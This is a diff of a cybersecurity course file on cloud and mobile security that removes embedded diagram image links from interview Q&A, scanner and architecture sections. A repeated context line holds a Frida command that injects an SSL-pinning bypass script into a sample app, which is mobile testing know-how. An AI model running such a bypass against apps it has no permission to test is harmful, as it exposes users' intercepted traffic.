 
 
 ```bash
@@ -2807,16 +2027,6 @@ frida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause
 ## Interview Corner
 
 ### Cloud Security Interview Q&A
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-interview-q-a-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-interview-q-a-handwritten.svg" alt="Handwritten: Cloud Security Interview Q&A" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-interview-q-a-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-interview-q-a-diagram.svg" alt="Diagram: Cloud Security Interview Q&A" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-interview-q-a-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-interview-q-a-sticky.svg" alt="Sticky Note: Cloud Security Interview Q&A" width="30%">
-</a>
 
 
 **Q1: Explain the Shared Responsibility Model and give an example of a common misconfiguration.**
@@ -2878,16 +2088,6 @@ frida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause
 **Key insight:** Serverless shifts responsibility from infrastructure to code + IAM. You no longer patch kernels, but you must validate every event input.
 
 ### Container & Kubernetes Interview Q&A
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-kubernetes-interview-q-a-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-kubernetes-interview-q-a-handwritten.svg" alt="Handwritten: Container & Kubernetes Interview Q&A" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-kubernetes-interview-q-a-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-kubernetes-interview-q-a-diagram.svg" alt="Diagram: Container & Kubernetes Interview Q&A" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-kubernetes-interview-q-a-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-kubernetes-interview-q-a-sticky.svg" alt="Sticky Note: Container & Kubernetes Interview Q&A" width="30%">
-</a>
 
 
 **Q6: What is a container escape and how do you prevent it?**
@@ -2957,16 +2157,6 @@ This creates exponential cost (1000 Lambda B invocations * N sub-items) and late
 **Where used:** S3 SSE-KMS, EBS encryption, RDS encryption, client-side encryption libraries (AWS Encryption SDK).
 
 ### Mobile Security Interview Q&A
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-security-interview-q-a-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-security-interview-q-a-handwritten.svg" alt="Handwritten: Mobile Security Interview Q&A" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-security-interview-q-a-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-security-interview-q-a-diagram.svg" alt="Diagram: Mobile Security Interview Q&A" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-security-interview-q-a-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-security-interview-q-a-sticky.svg" alt="Sticky Note: Mobile Security Interview Q&A" width="30%">
-</a>
 
 
 **Q11: How does iOS sandboxing differ from Android sandboxing?**
@@ -3236,16 +2426,6 @@ Conditional Access: MFA required, device must be MDM-enrolled, OS version ≥ cu
 
 ### Concept Comparison
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/concept-comparison-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/concept-comparison-handwritten.svg" alt="Handwritten: Concept Comparison" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/concept-comparison-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/concept-comparison-diagram.svg" alt="Diagram: Concept Comparison" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/concept-comparison-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/concept-comparison-sticky.svg" alt="Sticky Note: Concept Comparison" width="30%">
-</a>
-
 
 | Concept | Tool/Service | AWS | Azure | GCP |
 |---------|-------------|-----|-------|-----|
@@ -3288,16 +2468,6 @@ Conditional Access: MFA required, device must be MDM-enrolled, OS version ≥ cu
 ## TypeScript Implementations
 
 ### Cloud Security Posture Scanner
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-posture-scanner-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-posture-scanner-handwritten.svg" alt="Handwritten: Cloud Security Posture Scanner" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-posture-scanner-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-posture-scanner-diagram.svg" alt="Diagram: Cloud Security Posture Scanner" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-posture-scanner-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-security-posture-scanner-sticky.svg" alt="Sticky Note: Cloud Security Posture Scanner" width="30%">
-</a>
 
 
 ```typescript
@@ -3492,16 +2662,6 @@ findings.forEach((f) =>
 ```
 
 ### Container Security Scanner
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-security-scanner-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-security-scanner-handwritten.svg" alt="Handwritten: Container Security Scanner" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-security-scanner-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-security-scanner-diagram.svg" alt="Diagram: Container Security Scanner" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-security-scanner-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/container-security-scanner-sticky.svg" alt="Sticky Note: Container Security Scanner" width="30%">
-</a>
 
 
 ```typescript
@@ -3709,16 +2869,6 @@ configIssues.forEach((i) => console.log(`  ${i}`));
 
 ### Cloud Shared Responsibility Model
 
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-shared-responsibility-model-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-shared-responsibility-model-handwritten.svg" alt="Handwritten: Cloud Shared Responsibility Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-shared-responsibility-model-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-shared-responsibility-model-diagram.svg" alt="Diagram: Cloud Shared Responsibility Model" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-shared-responsibility-model-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/cloud-shared-responsibility-model-sticky.svg" alt="Sticky Note: Cloud Shared Responsibility Model" width="30%">
-</a>
-
 
 ```mermaid
 flowchart TD
@@ -3740,16 +2890,6 @@ flowchart TD
 ```
 
 ### Mobile App Sandbox Architecture
-
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-sandbox-architecture-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-sandbox-architecture-handwritten.svg" alt="Handwritten: Mobile App Sandbox Architecture" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-sandbox-architecture-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-sandbox-architecture-diagram.svg" alt="Diagram: Mobile App Sandbox Architecture" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-sandbox-architecture-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/07-cloud-mobile/mobile-app-sandbox-architecture-sticky.svg" alt="Sticky Note: Mobile App Sandbox Architecture" width="30%">
-</a>
 
 
 ```mermaid
